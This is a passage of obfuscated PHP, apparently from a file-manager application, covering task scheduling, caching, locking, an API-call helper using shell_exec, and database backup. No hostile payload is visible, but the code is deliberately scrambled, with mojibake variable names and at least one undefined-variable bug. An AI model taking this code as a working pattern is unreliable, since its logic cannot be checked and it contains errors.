} private static function taskTimeCheck($E¯É”¯¾) { goto b´ö×îˆ‚; E»´¾½õ¦¾: $dÍ˜°®¸Î— = strtotime($dÒ…òÏœˆ[1399] . $cÃÔ¶è ¢´[$dÒ…òÏœˆ[1400]] . $dÒ…òÏœˆ[1401]) - strtotime($dÒ…òÏœˆ[1402]); $eñ‘„ÔôàÃ = time() - strtotime(date($dÒ…òÏœˆ[1403]) . $dÒ…òÏœˆ[1404]); $F•¤áÊöî = $eñ‘„ÔôàÃ >= $dÍ˜°®¸Î— && $eñ‘„ÔôàÃ <= $dÍ˜°®¸Î— + 3600; goto c¶Íœö¶ÑÜ; c¶Íœö¶ÑÜ: switch ($cÃÔ¶è ¢´[$dÒ…òÏœˆ[39]]) { case $dÒ…òÏœˆ[1405]: if (time() - $BŠ“†¶…š’ < 3600 * 24 * 30) { return !1; } if ($cÃÔ¶è ¢´[$dÒ…òÏœˆ[1405]] == date($dÒ…òÏœˆ[1406]) && $F•¤áÊöî) { return !0; } break; case $dÒ…òÏœˆ[1407]: if (time() - $BŠ“†¶…š’ < 3600 * 24 * 7) { return !1; } $F±ñ¦ìš‹ = date($dÒ…òÏœˆ[1408]) == 0 ? 7 : date($dÒ…òÏœˆ[1408]); if ($cÃÔ¶è ¢´[$dÒ…òÏœˆ[1407]] == $F±ñ¦ìš‹ && $F•¤áÊöî) { return !0; } break; case $dÒ…òÏœˆ[1400]: if (time() - $BŠ“†¶…š’ < 3600 * 24) { return !1; } if ($F•¤áÊöî) { return !0; } break; case $dÒ…òÏœˆ[1409]: if (time() - $BŠ“†¶…š’ >= floatval($cÃÔ¶è ¢´[$dÒ…òÏœˆ[1409]]) * 60) { return !0; } break; default: break; } return !1; goto cÜ–‰èïë´; b´ö×îˆ‚: $dÒ…òÏœˆ =& $_SERVER[¨¤¼…´]; $cÃÔ¶è ¢´ = json_decode($E¯É”¯¾[$dÒ…òÏœˆ[204]], !0); $BŠ“†¶…š’ = intval($E¯É”¯¾[$dÒ…òÏœˆ[1390]]); goto E»´¾½õ¦¾; cÜ–‰èïë´: } public static function taskRun($f¢½º„…„™) { goto CßŒ¬…¢…Ú; d¤±ŠÔ­¬: $eßµÄ­ŠÇÁ = timeFloat(); $DäĞÆ£§–ö = $Bê‰¦Ì…½[43]; switch ($f¢½º„…„™[$Bê‰¦Ì…½[39]]) { case $Bê‰¦Ì…½[308]: $fÇâ¢ò™Ò· = url_request($f¢½º„…„™[$Bê‰¦Ì…½[1413]], $Bê‰¦Ì…½[230], !1, !1, !1, !1, 5); $DäĞÆ£§–ö = strlen($fÇâ¢ò™Ò·); break; case $Bê‰¦Ì…½[229]: $DäĞÆ£§–ö = Hook::apply($f¢½º„…„™[$Bê‰¦Ì…½[1413]]); default: break; } goto eÕ÷›œœáâ; CßŒ¬…¢…Ú: $Bê‰¦Ì…½ =& $_SERVER[¨¤¼…´]; self::log($Bê‰¦Ì…½[1410] . $f¢½º„…„™[$Bê‰¦Ì…½[379]] . $Bê‰¦Ì…½[1411] . $f¢½º„…„™[$Bê‰¦Ì…½[38]] . $Bê‰¦Ì…½[1412] . $f¢½º„…„™[$Bê‰¦Ì…½[1413]]); Model($Bê‰¦Ì…½[1396])->run($f¢½º„…„™[$Bê‰¦Ì…½[379]]); goto d¤±ŠÔ­¬; eÕ÷›œœáâ: Model($Bê‰¦Ì…½[1414])->add(array($Bê‰¦Ì…½[1415] => $Bê‰¦Ì…½[43], $Bê‰¦Ì…½[1416] => $Bê‰¦Ì…½[481], $Bê‰¦Ì…½[39] => $Bê‰¦Ì…½[1417] . $f¢½º„…„™[$Bê‰¦Ì…½[379]], $Bê‰¦Ì…½[1418] => json_encode(array($Bê‰¦Ì…½[38] => $f¢½º„…„™[$Bê‰¦Ì…½[38]], $Bê‰¦Ì…½[1419] => timeFloat() - $eßµÄ­ŠÇÁ, $Bê‰¦Ì…½[294] => $DäĞÆ£§–ö)))); self::log($Bê‰¦Ì…½[1420] . $f¢½º„…„™[$Bê‰¦Ì…½[379]] . $Bê‰¦Ì…½[1421] . $DäĞÆ£§–ö); return !0; goto fù×î¼ÄÍ‘; fù×î¼ÄÍ‘: } private static function valueGet($d‰¨‘“ñ) { $DÈÑ‰óï¤ =& $_SERVER[¨¤¼…´]; $c®¨Š²¾á = $DÈÑ‰óï¤[1422]; $dÈ¾‚°ƒİ… = Model($DÈÑ‰óï¤[1423])->get($d‰¨‘“ñ, $c®¨Š²¾á); if (is_null($dÈ¾‚°ƒİ…)) { Model($DÈÑ‰óï¤[1423])->set($DÈÑ‰óï¤[1394], 10, $c®¨Š²¾á); Model($DÈÑ‰óï¤[1423])->set($DÈÑ‰óï¤[679], $DÈÑ‰óï¤[93], $c®¨Š²¾á); Model($DÈÑ‰óï¤[1423])->set($DÈÑ‰óï¤[1389], $DÈÑ‰óï¤[481], $c®¨Š²¾á); $dÈ¾‚°ƒİ… = Model($DÈÑ‰óï¤[1423])->get($d‰¨‘“ñ, $c®¨Š²¾á); } return $dÈ¾‚°ƒİ…; } private static function valueSet($e³Úíìõ¦¢, $Fù¾ˆ×è›) { $D°èøÇˆ¨© =& $_SERVER[¨¤¼…´]; return Model($D°èøÇˆ¨©[1423])->set($e³Úíìõ¦¢, $Fù¾ˆ×è›, $D°èøÇˆ¨©[1422]); } protected static function log($F¿×‡‹) { write_log($F¿×‡‹, $_SERVER[¨¤¼…´][1424]); } private static function cacheClear() { $c×ù•Ù›î‰ =& $_SERVER[¨¤¼…´]; $b³¿ºŒ•ªÖ = Model($c×ù•Ù›î‰[1423])->cacheKey($c×ù•Ù›î‰[1422]); Cache::clearMemory($b³¿ºŒ•ªÖ); Model($c×ù•Ù›î‰[1396])->cacheClear(); } } goto B¹é‡•ÖÑ¼; bòÂ‰ˆ¹Ç¢: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto BÔ‰íä¹ŒÎ; F¤Êô¸µ : $CŸì¡°ƒÑé = $GLOBALS[$DœÆƒ…ç‡æ[6]][$DœÆƒ…ç‡æ[350]]; $Eì©à¦„Ø” = $CŸì¡°ƒÑé[$CŸì¡°ƒÑé[$DœÆƒ…ç‡æ[744]]]; $CáÜèáÙ—ì = $CŸì¡°ƒÑé[$DœÆƒ…ç‡æ[745]]; goto Dö»ØÍ¦„Õ; BÔ‰íä¹ŒÎ: $DœÆƒ…ç‡æ =& $_SERVER[¨¤¼…´]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto F¤Êô¸µ ; Dö»ØÍ¦„Õ: switch ($CŸì¡°ƒÑé[$DœÆƒ…ç‡æ[744]]) { case $DœÆƒ…ç‡æ[27]: self::$handle = Model($DœÆƒ…ç‡æ[746]); break; case $DœÆƒ…ç‡æ[747]: self::$handle = new CacheRedis($Eì©à¦„Ø”, $CáÜèáÙ—ì); break; case $DœÆƒ…ç‡æ[748]: self::$handle = new CacheMemcached($Eì©à¦„Ø”, $CáÜèáÙ—ì); break; case $DœÆƒ…ç‡æ[181]: self::$handle = new CacheFile($Eì©à¦„Ø”, $CáÜèáÙ—ì); break; default: break; } return self::$handle; goto f½äë–Œµñ; f½äë–Œµñ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Dœ÷¶ªÜè) { if (is_array($Dœ÷¶ªÜè) || is_object($Dœ÷¶ªÜè)) { $Dœ÷¶ªÜè = json_encode($Dœ÷¶ªÜè); } $Dœ÷¶ªÜè = rawurlencode($Dœ÷¶ªÜè); return md5(KOD_SITE_ID . $_SERVER[¨¤¼…´][80] . $Dœ÷¶ªÜè); } public static function get($a¨ïÚÇô) { $DÁÂ›Çê = self::key($a¨ïÚÇô); if (!isset(self::$memoryCache[$DÁÂ›Çê])) { $b¨òµ‰×Ñî = self::init()->get($DÁÂ›Çê); self::$memoryCache[$DÁÂ›Çê] = unserialize($b¨òµ‰×Ñî); } return self::$memoryCache[$DÁÂ›Çê]; } public static function set($DÈğ”‡¬—Š, $AŸÇ¸ô›Í†, $a§ñÀ˜õ§ = false) { goto bĞîĞ‡òğ; F¼øõ…ìƒ: CacheLock::lock($DÈğ”‡¬—Š); $EÑÅììíŞ = self::init()->set($E‚ƒç¡òºÊ, serialize($AŸÇ¸ô›Í†), $a§ñÀ˜õ§); self::$memoryCache[$E‚ƒç¡òºÊ] = $AŸÇ¸ô›Í†; goto C¹Òƒ©œßö; bĞîĞ‡òğ: $E‚ƒç¡òºÊ = self::key($DÈğ”‡¬—Š); if (isset(self::$memoryCache[$E‚ƒç¡òºÊ]) && self::$memoryCache[$E‚ƒç¡òºÊ] === $AŸÇ¸ô›Í†) { return !0; } if ($a§ñÀ˜õ§ === 0) { self::$memoryCache[$E‚ƒç¡òºÊ] = $AŸÇ¸ô›Í†; return !0; } goto F¼øõ…ìƒ; C¹Òƒ©œßö: CacheLock::unlock($DÈğ”‡¬—Š); return $EÑÅììíŞ; goto B‘šŒÁùĞÉ; B‘šŒÁùĞÉ: } public static function remove($c„³äŞÄªŸ) { goto FñÜãÔ·ÆÑ; dÉ„¤Öîóˆ: return $FğŸ»ÓÙİŞ; goto Dò¹Éæò; a¥ôÆÏë°„: CacheLock::lock($c„³äŞÄªŸ); $FğŸ»ÓÙİŞ = self::init()->remove($bäƒº‡Ì); CacheLock::unlock($c„³äŞÄªŸ); goto dÉ„¤Öîóˆ; FñÜãÔ·ÆÑ: $bäƒº‡Ì = self::key($c„³äŞÄªŸ); unset(self::$memoryCache[$bäƒº‡Ì]); self::clearTimeout(); goto a¥ôÆÏë°„; Dò¹Éæò: } public static function clearMemory($a« Ú‚¶‰ = false) { if ($a« Ú‚¶‰) { $a« Ú‚¶‰ = self::key($a« Ú‚¶‰); unset(self::$memoryCache[$a« Ú‚¶‰]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¨¤¼…´][749])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¨¤¼…´][750])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($E°ÍŸ™ĞÛ‰, $E‘ó³’±ëØ) { $B’ŞùÅã¸ =& $_SERVER[¨¤¼…´]; $this->cachePath = $E°ÍŸ™ĞÛ‰[$B’ŞùÅã¸[85]]; $this->prefix = $B’ŞùÅã¸[751]; $this->cacheTime = $E‘ó³’±ëØ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($bˆ¦Å¹ÕÈğ) { $c†š†«Ñå =& $_SERVER[¨¤¼…´]; $bˆ¦Å¹ÕÈğ = str_replace(array($c†š†«Ñå[752], $c†š†«Ñå[103], $c†š†«Ñå[79]), $c†š†«Ñå[753], $bˆ¦Å¹ÕÈğ); return $this->cachePath . $c†š†«Ñå[754] . $bˆ¦Å¹ÕÈğ . $c†š†«Ñå[755]; } public function set($aÜç—–ÊëŠ, $b°¾‹áĞ®, $Eèèé…»Ë = false) { $dí­ëÕ§¢ = $this->getFile($aÜç—–ÊëŠ); if (file_put_contents($dí­ëÕ§¢, $this->prefix . $b°¾‹áĞ®, LOCK_EX)) { return !0; } @unlink($dí­ëÕ§¢); return !1; } public function get($bÏ±í‘®Áğ) { $aõÓ´‹’ = $this->getFile($bÏ±í‘®Áğ); if (file_exists($aõÓ´‹’) && filemtime($aõÓ´‹’) < time() - $this->cacheTime) { @unlink($aõÓ´‹’); return !1; } $Dßœ±ÃÓç² = @file_get_contents($aõÓ´‹’); return substr($Dßœ±ÃÓç², strlen($this->prefix)); } public function remove($e£°ŒÃ­) { $fÆåÒãò¶  = $this->getFile($e£°ŒÃ­); return @unlink($fÆåÒãò¶ ); } public function deleteAll() { $CÂ£©œ—¢ì =& $_SERVER[¨¤¼…´]; $fùºíÇÑƒ‘ = scandir($this->cachePath); foreach ($fùºíÇÑƒ‘ as $C¶›·˜¯) { $DÀœ®„¼¼™ = $this->cachePath . $C¶›·˜¯; if (strpos($DÀœ®„¼¼™, $CÂ£©œ—¢ì[755]) && strpos($DÀœ®„¼¼™, $CÂ£©œ—¢ì[756])) { @unlink($DÀœ®„¼¼™); } } } public function clearTimeout() { $Aí¢îŒ¡õñ =& $_SERVER[¨¤¼…´]; $dåœ¬íÀçê = scandir($this->cachePath); foreach ($dåœ¬íÀçê as $A ÑÍ×¿¢…) { $fèƒèÑø = $this->cachePath . $A ÑÍ×¿¢…; if (strpos($fèƒèÑø, $Aí¢îŒ¡õñ[755]) && strpos($fèƒèÑø, $Aí¢îŒ¡õñ[756]) && filemtime($fèƒèÑø) < time() - $this->cacheTime) { @unlink($fèƒèÑø); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto b”ŠíÍÇ¤; f‹Ñ óÆˆ: if ($bÊ‹è¢¶ == $D¸¶ó‚‚…Ş[27] && $cøõî÷†Œ™ == $D¸¶ó‚‚…Ş[19]) { $bÊ‹è¢¶ = $D¸¶ó‚‚…Ş[181]; } switch ($bÊ‹è¢¶) { case $D¸¶ó‚‚…Ş[747]: self::$handle = new CacheLockRedis(); break; case $D¸¶ó‚‚…Ş[748]: self::$handle = new CacheLockMemcached(); break; case $D¸¶ó‚‚…Ş[27]: self::$handle = new CacheLockDatabase(); break; case $D¸¶ó‚‚…Ş[181]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto FÉæÊ›÷ïÏ; b”ŠíÍÇ¤: $D¸¶ó‚‚…Ş =& $_SERVER[¨¤¼…´]; if (self::$handle) { return self::$handle; } $FàºÒÀ–—Â = $GLOBALS[$D¸¶ó‚‚…Ş[6]][$D¸¶ó‚‚…Ş[350]]; goto d…¬Ç¨°¡â; d…¬Ç¨°¡â: self::$timeout = $FàºÒÀ–—Â[$D¸¶ó‚‚…Ş[757]] ? $FàºÒÀ–—Â[$D¸¶ó‚‚…Ş[757]] : 10; $cøõî÷†Œ™ = _get($GLOBALS[$D¸¶ó‚‚…Ş[6]], $D¸¶ó‚‚…Ş[758]); $bÊ‹è¢¶ = $FàºÒÀ–—Â[$D¸¶ó‚‚…Ş[744]] ? $FàºÒÀ–—Â[$D¸¶ó‚‚…Ş[744]] : $D¸¶ó‚‚…Ş[181]; goto f‹Ñ óÆˆ; FÉæÊ›÷ïÏ: } private static function key($A¦œ‘îï«“) { return $_SERVER[¨¤¼…´][759] . Cache::key($A¦œ‘îï«“); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($BŒîˆŒ’Ê» = '') { self::$errorMsg = $BŒîˆŒ’Ê»; } public static function lockGlobal($bŒ†ß¾, $EÃğÂ£Î…‰) { return self::lock($bŒ†ß¾, $EÃğÂ£Î…‰, !0); } public static function lock($C¤…˜—¦…, $DÏ¥¡ëîÈ÷ = false, $eöŠƒŒÍõ = false) { goto C—ƒÒÕ¾à; e²—‚¢¼¨: if (!$eöŠƒŒÍõ) { self::$lockItem[$fùÍ®éÊéˆ] = !0; } return $f§ÃŠ±¤Ì»; goto DŸËçã—À÷; C—ƒÒÕ¾à: $A£ô×Êèë‡ =& $_SERVER[¨¤¼…´]; $Fœé£šÕŒË = self::init(); $fùÍ®éÊéˆ = self::key($C¤…˜—¦…); goto d²ø™·¢æõ; d²ø™·¢æõ: $DÏ¥¡ëîÈ÷ = $DÏ¥¡ëîÈ÷ ? $DÏ¥¡ëîÈ÷ : self::$timeout; $f§ÃŠ±¤Ì» = $Fœé£šÕŒË->lock($fùÍ®éÊéˆ, $DÏ¥¡ëîÈ÷); if (!$f§ÃŠ±¤Ì») { $AøÌ²ÔÒ§ = $A£ô×Êèë‡[760] . $DÏ¥¡ëîÈ÷ . $A£ô×Êèë‡[77] . self::$errorMsg . $A£ô×Êèë‡[77] . get_caller_msg(); $aì“¥ñÙŒø = "\114\x6f\143\x6b\40\x61\143\x74\x69\157\x6e\x3a\x20{$fùÍ®éÊéˆ}\40\x74\x69\155\x65\x6f\x75\x74\54\157\166\x65\162\x20{$DÏ¥¡ëîÈ÷}\x20\163"; $aì“¥ñÙŒø = self::$errorMsg ? self::$errorMsg : $Fğ×Ÿ¢¬±Ë; write_log($AøÌ²ÔÒ§, $A£ô×Êèë‡[761]); show_json($aì“¥ñÙŒø, !1); } goto e²—‚¢¼¨; DŸËçã—À÷: } public static function lockGet($aÉ†Ø°ÊÀ„) { $FãéŸ¥à‘† = self::key($aÉ†Ø°ÊÀ„); if (self::$lockItem[$FãéŸ¥à‘†]) { return self::$lockItem[$FãéŸ¥à‘†]; } return self::init()->lockGet($FãéŸ¥à‘†); } public static function unlock($d°ÕÃµ‚¸¥) { $b¹¹®ƒ¤îÄ = self::key($d°ÕÃµ‚¸¥); self::$lockItem[$b¹¹®ƒ¤îÄ] = null; return self::init()->unlock($b¹¹®ƒ¤îÄ); } public static function unlockRuntime() { $d½ƒŞÔåßç =& $_SERVER[¨¤¼…´]; $bóÓ¯á£ÒÉ = self::init(); $d„ñâÉùƒ = !1; foreach (self::$lockItem as $EÉ —Ì„²Ï => $bª½Á»¬‡Œ) { if (!$bª½Á»¬‡Œ) { continue; } $bóÓ¯á£ÒÉ->unlock($EÉ —Ì„²Ï); if (!$d„ñâÉùƒ) { $d„ñâÉùƒ = !0; write_log($d½ƒŞÔåßç[762] . $EÉ —Ì„²Ï . $d½ƒŞÔåßç[77] . get_caller_msg(), $d½ƒŞÔåßç[761]); continue; } write_log($d½ƒŞÔåßç[762] . $EÉ —Ì„²Ï, $d½ƒŞÔåßç[761]); } self::fileUnlockAll(); } public static function fileLock($fæ¶—·«Ù) { goto d±‹ö’Ã³¢; fİÄ›¿º•: if (flock($eø©àåÈµù, LOCK_EX)) { return !0; } self::unlock($fæ¶—·«Ù); show_json($CÅØÌ¹„Âí[766], !1); goto cÍ‰ƒà¯ÏŒ; d±‹ö’Ã³¢: $CÅØÌ¹„Âí =& $_SERVER[¨¤¼…´]; if (!$GLOBALS[$CÅØÌ¹„Âí[763]]) { $GLOBALS[$CÅØÌ¹„Âí[763]] = array(); } $GLOBALS[$CÅØÌ¹„Âí[763]][$fæ¶—·«Ù] = !1; goto A–öÕ‚âƒñ; A–öÕ‚âƒñ: $eø©àåÈµù = fopen(DATA_PATH . $fæ¶—·«Ù . $CÅØÌ¹„Âí[764], $CÅØÌ¹„Âí[765]); if (!$eø©àåÈµù) { return !1; } $GLOBALS[$CÅØÌ¹„Âí[763]][$fæ¶—·«Ù] = $eø©àåÈµù; goto fİÄ›¿º•; cÍ‰ƒà¯ÏŒ: return !1; goto d´Ä×•Ñ´Â; d´Ä×•Ñ´Â: } public static function fileUnlock($b½Û»ßÜß) { $AÄùÛ»é¿ =& $_SERVER[¨¤¼…´]; $Eˆù¿éŠ¥ª = $GLOBALS[$AÄùÛ»é¿[763]][$b½Û»ßÜß]; if (!$Eˆù¿éŠ¥ª) { return; } $GLOBALS[$AÄùÛ»é¿[763]][$b½Û»ßÜß] = !1; flock($Eˆù¿éŠ¥ª, LOCK_UN); fclose($Eˆù¿éŠ¥ª); } public static function fileUnlockAll() { $eœ‘ğÔÕ‘ô =& $_SERVER[¨¤¼…´]; if (!$GLOBALS[$eœ‘ğÔÕ‘ô[763]]) { return; } foreach ($GLOBALS[$eœ‘ğÔÕ‘ô[763]] as $CÇç§èØÁ÷ => $d¬ë¤®Å–ì) { if (!$d¬ë¤®Å–ì) { continue; } $GLOBALS[$eœ‘ğÔÕ‘ô[763]][$CÇç§èØÁ÷] = !1; flock($d¬ë¤®Å–ì, LOCK_UN); fclose($d¬ë¤®Å–ì); } $GLOBALS[$eœ‘ğÔÕ‘ô[763]] = array(); } } goto AÎ¦‡ØØ; b„ä¯”ïÒø: function ActionCall($Dº–Ãé–†İ) { $FÚ„‡ÁÃ¶ = array_slice(func_get_args(), 1); return ActionApply($Dº–Ãé–†İ, $FÚ„‡ÁÃ¶); } function ActionCallApi($eçø¿Ÿ¥Ğö, $E Î†ÃøÎ¥ = '') { goto E¾¾ö”¬ÅË; FÔ×éÉËçğ: return $F¯Á‚½£ï; goto E‰æöÁÙñ; f£òá®Š†: $F×óÈ£Ëâ = json_decode($E‰Åä«±”í, !0); $F¯Á‚½£ï = is_array($F×óÈ£Ëâ) ? $F×óÈ£Ëâ : array($d”Âˆ›óÏ[29] => null, $d”Âˆ›óÏ[30] => $E‰Åä«±”í); if (!$F×óÈ£Ëâ) { echo $E‰Åä«±”í; } goto FÔ×éÉËçğ; aÓ©÷ËÙê«: $Fµó‰É¸¹ö = Action($d”Âˆ›óÏ[19])->accessToken(); $eçø¿Ÿ¥Ğö = str_replace($d”Âˆ›óÏ[5], $d”Âˆ›óÏ[4], $eçø¿Ÿ¥Ğö) . $d”Âˆ›óÏ[20] . $Fµó‰É¸¹ö . $b¼«À‹ò¾î; $E‰Åä«±”í = $d”Âˆ›óÏ[16]; goto Aíï¶ÃÈ; E¾¾ö”¬ÅË: $d”Âˆ›óÏ =& $_SERVER[ë‹ºñÌ†‡]; $b¼«À‹ò¾î = $E Î†ÃøÎ¥; if (is_array($E Î†ÃøÎ¥)) { $b¼«À‹ò¾î = $d”Âˆ›óÏ[16]; foreach ($E Î†ÃøÎ¥ as $c³‚ˆ—‡¼Ò => $eë«‡Æçï) { $eë«‡Æçï = is_array($eë«‡Æçï) ? json_encode($eë«‡Æçï) : $eë«‡Æçï; $eë«‡Æçï = is_bool($eë«‡Æçï) ? intval($eë«‡Æçï) : $eë«‡Æçï; $b¼«À‹ò¾î .= $d”Âˆ›óÏ[17] . $c³‚ˆ—‡¼Ò . $d”Âˆ›óÏ[18] . rawurlencode($eë«‡Æçï); } } goto aÓ©÷ËÙê«; Aíï¶ÃÈ: $aÀ°ßã„Øƒ = phpBinCommand(); if ($aÀ°ßã„Øƒ && function_exists($d”Âˆ›óÏ[21])) { $b„Øµö’¾â = $aÀ°ßã„Øƒ . $d”Âˆ›óÏ[22] . BASIC_PATH . $d”Âˆ›óÏ[23] . escapeshellarg($eçø¿Ÿ¥Ğö); $E‰Åä«±”í = shell_exec($b„Øµö’¾â); } if (!$E‰Åä«±”í) { $aÍÛäã²›Ã = stream_context_create(array($d”Âˆ›óÏ[24] => array($d”Âˆ›óÏ[25] => 20, $d”Âˆ›óÏ[26] => $d”Âˆ›óÏ[27]))); $E‰Åä«±”í = file_get_contents(APP_HOST . $d”Âˆ›óÏ[28] . $eçø¿Ÿ¥Ğö, !1, $aÍÛäã²›Ã); } goto f£òá®Š†; E‰æöÁÙñ: } function ActionCallHook($Aç’§°ãó) { goto c…ª‡ƒ±Ñ; c…ª‡ƒ±Ñ: $c¶ãŸ’›É¼ =& $_SERVER[ë‹ºñÌ†‡]; ob_start(); $B„éÚ³¾·Š = array_slice(func_get_args(), 1); goto Aã §¼•Ò; Aã §¼•Ò: $GLOBALS[$c¶ãŸ’›É¼[31]] = 1; $dğŞåË…¢ = ActionApply($Aç’§°ãó, $B„éÚ³¾·Š); $AŠë¨´Ë°õ = ob_get_clean(); goto FË•™Ãğµ¡; FË•™Ãğµ¡: $dğŞåË…¢ = $AŠë¨´Ë°õ ? json_decode($AŠë¨´Ë°õ, !0) : $dğŞåË…¢; $GLOBALS[$c¶ãŸ’›É¼[31]] = 0; return $dğŞåË…¢; goto a„õÇöğ¾‚; a„õÇöğ¾‚: } goto cò±•—Û•; dš‹‘ †Éõ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x62\x61\x63\153\165\x70\114\151\x73\x74"; public $field = array("\151\x6f", "\156\x61\x6d\145", "\163\164\141\x74\x75\163", "\x63\x6f\156\164\x65\156\164", "\162\x65\x73\165\x6c\164", "\x74\x69\155\x65\x46\x72\x6f\155", "\x74\151\x6d\145\x54\157"); public function config() { goto a¤Ö³°å”º; d°‹×„Î°˜: Action($aÄÅâÕÉøœ[2118])->taskInit(); $f¹‰â§°Õ = Model($aÄÅâÕÉøœ[2119])->listData(); foreach ($f¹‰â§°Õ as $cäÖÈ¾ÑÎ) { if ($cäÖÈ¾ÑÎ[$aÄÅâÕÉøœ[1070]] == $aÄÅâÕÉøœ[93] && $cäÖÈ¾ÑÎ[$aÄÅâÕÉøœ[1413]] == $aÄÅâÕÉøœ[2120]) { $c¬Üôøğï = $cäÖÈ¾ÑÎ; break; } } goto eÀŠì óË; a¤Ö³°å”º: $aÄÅâÕÉøœ =& $_SERVER[¨¤¼…´]; $Dƒ¶“ù¤Ò = Model($aÄÅâÕÉøœ[1078])->get($aÄÅâÕÉøœ[703]); $Dƒ¶“ù¤Ò = json_decode($Dƒ¶“ù¤Ò, !0); goto Dµœ–› ¨; Dµœ–› ¨: $Dƒ¶“ù¤Ò = is_array($Dƒ¶“ù¤Ò) ? $Dƒ¶“ù¤Ò : array(); if (!isset($Dƒ¶“ù¤Ò[$aÄÅâÕÉøœ[682]])) { $Dƒ¶“ù¤Ò[$aÄÅâÕÉøœ[682]] = $aÄÅâÕÉøœ[93]; } $c¬Üôøğï = array(); goto d°‹×„Î°˜; eÀŠì óË: if (isset($c¬Üôøğï[$aÄÅâÕÉøœ[204]])) { $c¬Üôøğï[$aÄÅâÕÉøœ[204]] = json_decode($c¬Üôøğï[$aÄÅâÕÉøœ[204]], !0); } if (isset($Dƒ¶“ù¤Ò[$aÄÅâÕÉøœ[204]])) { $c¬Üôøğï[$aÄÅâÕÉøœ[204]][$aÄÅâÕÉøœ[1400]] = $Dƒ¶“ù¤Ò[$aÄÅâÕÉøœ[204]]; unset($Dƒ¶“ù¤Ò[$aÄÅâÕÉøœ[204]]); } return array_merge($c¬Üôøğï, $Dƒ¶“ù¤Ò); goto fÕËˆó–˜è; fÕËˆó–˜è: } public function listData($dñïôßŞÈ÷ = false, $DØñÓ×Ö¦ = "\155\x6f\x64\151\x66\x79\x54\151\155\x65", $BÌ¨º‡¸­ = false) { return parent::listData($dñïôßŞÈ÷, $DØñÓ×Ö¦, !0); } public function lastItem() { $d¸ˆ´õÇ°‡ = $this->listData(); return !empty($d¸ˆ´õÇ°‡[0]) ? $d¸ˆ´õÇ°‡[0] : null; } public function kill($bÓ„Ì‰Œ†¿) { goto b´ñ¬­‰ïÛ; Eâ§¼·±§: $aÎöƒ·£‡ä = $AÄù¯¢º¬[$bœÎ¿ËÊªá[38]]; $B©’¹Ê…ÜÕ = TEMP_FILES . $bœÎ¿ËÊªá[699] . $aÎöƒ·£‡ä . $bœÎ¿ËÊªá[8]; IO::remove($B©’¹Ê…ÜÕ, !1); goto FÍÙ¬‘Îöˆ; b´ñ¬­‰ïÛ: $bœÎ¿ËÊªá =& $_SERVER[¨¤¼…´]; $AÄù¯¢º¬ = $this->listData($bÓ„Ì‰Œ†¿); if (!$AÄù¯¢º¬ || empty($AÄù¯¢º¬[$bœÎ¿ËÊªá[38]])) { return !0; } goto a‘»îÕê¿Ï; a‘»îÕê¿Ï: Task::kill($bœÎ¿ËÊªá[702]); Task::kill($bœÎ¿ËÊªá[718]); Task::kill($bœÎ¿ËÊªá[726]); goto Eâ§¼·±§; FÍÙ¬‘Îöˆ: return $this->remove($bÓ„Ì‰Œ†¿); goto c¥×Ï‘¡æ„; c¥×Ï‘¡æ„: } public function remove($FÖ×¾©õ©) { $Bè¨¥èÑã§ = $this->listData($FÖ×¾©õ©); if (!$Bè¨¥èÑã§) { return !0; } return $this->backupRemove($Bè¨¥èÑã§); } private function backupRemove($aî§”ÜÇÅ÷) { $B¾•Ø›ÃÖ =& $_SERVER[¨¤¼…´]; parent::remove($aî§”ÜÇÅ÷[$B¾•Ø›ÃÖ[379]]); $A­íä¬»Ó = "\x7b\x69\x6f\72{$aî§”ÜÇÅ÷[$B¾•Ø›ÃÖ[681]]}\x7d\x2f\144\141\x74\x61\x62\x61\163\145\x2f\142\x61\x63\x6b\x75\x70\137" . $aî§”ÜÇÅ÷[$B¾•Ø›ÃÖ[38]]; IO::remove($A­íä¬»Ó, !1); return !0; } public function start() { goto bÏ¤ÒæàŠ; b£ß£«‡¼: $dĞ¨ÒÎÀÛµ = new Backup(); $dĞ¨ÒÎÀÛµ->keep(); if (!$dĞ¨ÒÎÀÛµ->db()) { return !1; } goto f¯©Ï·±ï; c°¼íÙ¹ªğ: if (!$FÍ†Ñ°²æï || $FÍ†Ñ°²æï[$AÙÄ›” —[1397]] != $AÙÄ›” —[93]) { return !1; } $E®œöÔ°Ôø = $this->process(); foreach ($E®œöÔ°Ôø as $F™º–“ø¤˜) { if ($F™º–“ø¤˜) { return Task::restart($F™º–“ø¤˜[$AÙÄ›” —[379]]); } } goto b£ß£«‡¼; f¯©Ï·±ï: if (!$dĞ¨ÒÎÀÛµ->dbFile()) { return !1; } if ($FÍ†Ñ°²æï[$AÙÄ›” —[682]] == $AÙÄ›” —[481]) { $dĞ¨ÒÎÀÛµ->file(); } Backup::set(array($AÙÄ›” —[679] => 1, $AÙÄ›” —[460] => time())); goto c²¦Áôë»; c²¦Áôë»: return !0; goto FÊÍ Íåæ; bÏ¤ÒæàŠ: $AÙÄ›” — =& $_SERVER[¨¤¼…´]; if ($GLOBALS[$AÙÄ›” —[6]][$AÙÄ›” —[94]][$AÙÄ›” —[2121]] != $AÙÄ›” —[93]) { return !0; } $FÍ†Ñ°²æï = $this->config(); goto c°¼íÙ¹ªğ; FÊÍ Íåæ: } public function process() { $dõİƒˆÃŸÄ =& $_SERVER[¨¤¼…´]; return array($dõİƒˆÃŸÄ[684] => Task::get($dõİƒˆÃŸÄ[702]), $dõİƒˆÃŸÄ[687] => Task::get($dõİƒˆÃŸÄ[718]), $dõİƒˆÃŸÄ[181] => Task::get($dõİƒˆÃŸÄ[726])); } public function restore() { $bêªÓ†õŠ =& $_SERVER[¨¤¼…´]; ActionCall($bêªÓ†õŠ[960], !0, 1); ActionCall($bêªÓ†õŠ[960], !0, 0); } } class 